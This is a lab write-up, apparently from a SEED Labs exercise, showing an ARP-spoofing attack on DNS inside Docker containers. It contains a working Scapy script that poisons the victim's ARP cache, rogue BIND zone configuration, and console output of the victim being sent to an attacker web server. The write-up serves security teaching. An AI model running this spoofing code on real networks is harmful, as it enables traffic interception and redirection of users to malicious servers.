# AITM ATTACK - ARP SPOOFING ON DNS

## SETUP

Starting from the setup taken from the _DNS_local_ laboratory from SEEDLABS the configuration files were slightly modified to replicate the scenario in the proposal.

### Attacker NS

The attacker name server was modified to include the zone configuration file `db.alerenda.github.io`:
```dns
$TTL 60
@	IN	SOA	ns.attacker32.com. admin.attacker32.com (
		2026011401
		1H
		15M
		1W
		60	)

@	IN	NS ns.attacker32.com.
@	IN	A 10.9.0.2
```

This redirects requests to the matching zone to the attacker NS.  
The `Dockerfile` was updated to include this new file in the attacker NS container.

The following was added in `named.conf`

```
zone "alerenda.github.io" {
       type master;
       file "/etc/bind/db.alerenda.github.io";
};
```

which registers the zone `alerenda.github.io` in the attacker NS so that it can act as the owner of the zone.

The following script was added to spoof the ARP cache of the victim to trick it into thinking that it's talking with its NS when instead is talking with the attacker NS
```python
from scapy.all import *
import time

MAC_M = '02:42:0a:09:00:99'   # attacker MAC
MAC_A = '02:42:0a:09:00:05'   # victim MAC
IP_A  = '10.9.0.5'            # victim IP
IP_B  = '10.9.0.53'           # DNS server IP

E = Ether(src=MAC_M, dst=MAC_A)
A = ARP(
    op=2,                  # ARP reply
    psrc=IP_B,              # pretend to be DNS
    hwsrc=MAC_M,            # attacker MAC
    pdst=IP_A,              # victim IP
    hwdst=MAC_A             # victim MAC
)

pkt = E / A

while True:
    sendp(pkt, iface="eth0", verbose=False)
    time.sleep(5)
```
the script will be called `spoofing.py`.

### Attacker

The attacker container was modified to have IP `10.9.0.2` on the local network and use `10.9.0.11` as router:
```diff
-        network_mode: host
+        networks:
+            net-10.9.0.0:
+                ipv4_address: 10.9.0.2
```

The attacker was assigned a simple HTML file to serve when the victim connects to it:
```HTML
<!DOCTYPE html>
<html lang="en">
	<head></head>
	<body>
		<h1>ARP SPOOFED</h1>
	</body>
</html>
```

###  Local NS

The `named.conf.options` in the local NS was updated to include a forwarding option using Google DNS:
```diff
-       // forwarders {
-       //      0.0.0.0;
-       // };
+       forwarders {
+               8.8.8.8;
+       };
```

## INITIAL SETTING

As initial setting, on the user machine a request for `alerenda.github.io` was performed with the following result:
```console
root@43ac8970545f:/# dig +short alerenda.github.io
185.199.108.153
185.199.111.153
185.199.110.153
185.199.109.153
root@43ac8970545f:/# curl -I alerenda.github.io
HTTP/1.1 301 Moved Permanently
Connection: keep-alive
Content-Length: 162
Server: GitHub.com
Content-Type: text/html
Location: https://alerenda.github.io/
X-GitHub-Request-Id: F376:234C6B:BA899A:BE0E9A:6968BC7E
Accept-Ranges: bytes
Age: 0
Date: Thu, 15 Jan 2026 10:07:59 GMT
Via: 1.1 varnish
X-Served-By: cache-lin1730056-LIN
X-Cache: MISS
X-Cache-Hits: 0
X-Timer: S1768471680.657004,VS0,VE105
Vary: Accept-Encoding
X-Fastly-Request-ID: 4dd5be461c3a885c3fb7a2a842e3782af8d81e2f
```
This shows that forwarding on the local NS works and that the name resolution succeeds as intended.  
The ARP cache is content is as follows:
```console
root@43ac8970545f:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.11                ether   02:42:0a:09:00:0b   C                     eth0
10.9.0.53                ether   02:42:0a:09:00:53   C                     eth0
```
since no spoofing attack has been carried yet.

## DNS QUERY WITH SPOOFED NS

At this point, the attacker NS is told to treat `10.9.0.53` as its own IP:
```shell
ip addr add 10.9.0.53/32 dev eth0
```
In this way it treats requests for `10.9.0.53` as if they were intended for it.  
It also starts `spoofing.py` to convince the victim to connect to it instead of the local NS.

Now the user repeats the DNS query:
```console
root@43ac8970545f:/# dig +short alerenda.github.io
10.9.0.2
```
This shows that now the attacker NS is being used to resolve hostnames, as intedned.

### ATTACKER HTTP SERVER

On the attacker machine the python module `http.server` is started on port 80 to serve files to hosts that connect to it.

The victim makes a request for `alerenda.github.io` using `curl`:
```console
root@43ac8970545f:/# curl alerenda.github.io
<!DOCTYPE html>
<html lang="en">
	<head></head>
	<body>
		<h1>ARP SPOOFED</h1>
	</body>
</html>
```
which shows that the user has been successfully spoofed on a malicious HTTP server while searching `alerenda.github.io`.